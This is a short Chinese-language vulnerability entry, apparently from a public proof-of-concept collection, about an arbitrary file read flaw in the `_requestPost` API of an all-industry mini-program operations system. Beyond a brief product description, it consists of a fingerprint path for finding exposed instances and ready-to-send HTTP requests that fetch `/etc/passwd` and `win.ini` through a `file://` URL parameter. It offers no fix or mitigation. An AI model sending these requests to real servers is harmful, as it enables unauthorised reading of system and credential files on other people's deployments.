# 全行业小程序运营系统接口_requestPost存在任意文件读取漏洞

# 一、漏洞简介
全行业小程序运营系统是一个无需编程，各行业模版直接套用，一键生成，轻松搭建小程序，界面自由DIY，同步实时预览，可视化操作让您所见即所得，随心打造个性小程序。全行业小程序运营系统接口_requestPost存在任意文件读取漏洞

# 二、影响版本
全行业小程序运营系统

# 三、资产测绘
```plain
"/com/css/head_foot.css"
```


# 四、漏洞复现
```plain
GET /api/wxapps/_requestPost?url=file:///etc/passwd&data=1 HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
```


```plain
/api/wxapps/_requestPost?url=file:///C:/windows/win.ini&data=1
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/xhsw1s8g1fmxb8nf>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
